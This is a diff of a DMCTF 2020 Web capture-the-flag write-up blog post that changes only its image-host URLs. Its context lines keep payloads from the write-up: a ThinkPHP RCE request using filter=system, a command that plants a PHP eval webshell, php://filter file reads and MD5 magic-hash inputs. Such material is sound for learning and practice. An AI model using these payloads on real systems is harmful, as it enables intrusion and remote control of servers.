@@ -3,7 +3,7 @@ title: DMCTF之Web
 date: 2020-11-29 23:17:50
 categories: ['CTF']
 tags: ['web','DMCTF2020','RCE']
-cover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120232346.png
+cover: https://cdn.jsdelivr.net/gh/penginman/PicBed@master/cover/20201120232346.png
 ---
 
 # 前言
@@ -12,7 +12,7 @@ cover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/2020112023234
 
 这次先写Web题目部分，我最后的排名：
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png)
 
 # Web
 
@@ -88,7 +88,7 @@ url: `http://dmctf.vaala.cloud:28113/?num=202020020a&v1=QNKCDZO&v2=240610708`
 
 post: `message=`
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129202453.png)
 
 ## thinkphp
 
@@ -104,7 +104,7 @@ post: `message=`
 
 虽然报错但是最上方输出了`www-data`
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203051.png)
 
 根据题目中的提示**flag在环境变量中**，所以在网上查询linux系统输出环境变量的语句：
 
@@ -121,7 +121,7 @@ post： `_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=env
 
 在输出末尾即是flag。
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129203818.png)
 
 ## fungame
 
@@ -156,7 +156,7 @@ class PlayerData
 
  击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129204724.jpg)
 
 ## bingxie
 
@@ -294,7 +294,7 @@ http://网址/bingxie.php?a=QNKCDZO&b=240610708
 
 使用Behinder连接。可以在根目录下找到flag。
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129210207.png)
 
 ## filerce
 
@@ -365,7 +365,7 @@ http://网址?file=php://filter/convert.base64-decode/resource=thx.log
 
 同样在根目录下找到flag。
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129224231.png)
 
 ## do_you_have_a_right_token
 
@@ -418,7 +418,7 @@ echo time();
 ?>
 ```
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211010.png)
 
 计算时间差为69，所以修改代码跑一遍：
 
@@ -435,7 +435,7 @@ date_default_timezone_set('Asia/Shanghai');
 
 提交本地运行后得到的密文提交上去就可以获得flag。
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129211832.png)
 
 ## pingpingping
 
@@ -448,7 +448,7 @@ CODE
 
 获得flag
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129230355.png)
 
 ## p3’webshell
 
@@ -477,4 +477,4 @@ command=fputs(fopen('shell.php','w'),'<?php @eval($_POST['a']);?>');
 
 使用蚁剑连接`http://网址/shell.php`，在根目录里找到flag。
 
-![img](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png)
+![img](https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201129225225.png)
